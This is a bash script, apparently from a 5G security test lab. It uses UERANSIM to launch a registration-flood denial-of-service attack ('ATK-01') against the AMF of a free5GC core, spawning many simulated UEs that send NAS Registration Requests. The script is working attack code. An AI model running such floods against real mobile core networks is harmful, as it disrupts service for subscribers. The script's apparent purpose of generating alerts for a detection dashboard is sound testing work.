#!/bin/bash
# ATK-01 — Registration Flood (DoS on AMF)
# Spawns N UERANSIM UE instances hammering the AMF with NAS Registration Requests.
#
# Usage: ./attack-reg-flood.sh [count=15] [duration=60]
#
# Safety:  keep count ≤ 15 on a dev machine to avoid OOM-killing free5GC containers.
# Recovery: docker compose -f docker/docker-compose-5gc.yml restart amf

COUNT=${1:-15}
DURATION=${2:-60}
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CONFIG_TPL="${SCRIPT_DIR}/../config/ueransim/free5gc-ue-flood.yaml"
GNB_CFG="${SCRIPT_DIR}/../config/ueransim/free5gc-gnb.yaml"

if ! command -v nr-ue &>/dev/null; then
  echo "[ATK-01] ERROR: nr-ue not found. Install UERANSIM first." >&2
  exit 1
fi

if [ ! -f "$CONFIG_TPL" ]; then
  echo "[ATK-01] ERROR: UE template not found: $CONFIG_TPL" >&2
  exit 1
fi

echo "[ATK-01] Starting gNB..."
nr-gnb -c "$GNB_CFG" &
GNB_PID=$!
sleep 1

echo "[ATK-01] Launching $COUNT UEs for ${DURATION}s"

PIDS=()
for i in $(seq 1 "$COUNT"); do
  SUPI=$(printf "imsi-00101%010d" "$i")
  TMP_CFG="/tmp/ue-flood-$i.yaml"
  sed "s/supi: .*/supi: '$SUPI'/" "$CONFIG_TPL" > "$TMP_CFG"
  nr-ue -c "$TMP_CFG" &
  PIDS+=($!)
done

echo "[ATK-01] Flood running — Ctrl+C or wait ${DURATION}s"
sleep "$DURATION"

echo "[ATK-01] Stopping UEs"
for pid in "${PIDS[@]}"; do kill "$pid" 2>/dev/null; done
kill "$GNB_PID" 2>/dev/null
wait 2>/dev/null

echo "[ATK-01] Done. Check /security/dashboard for CRITICAL alerts."
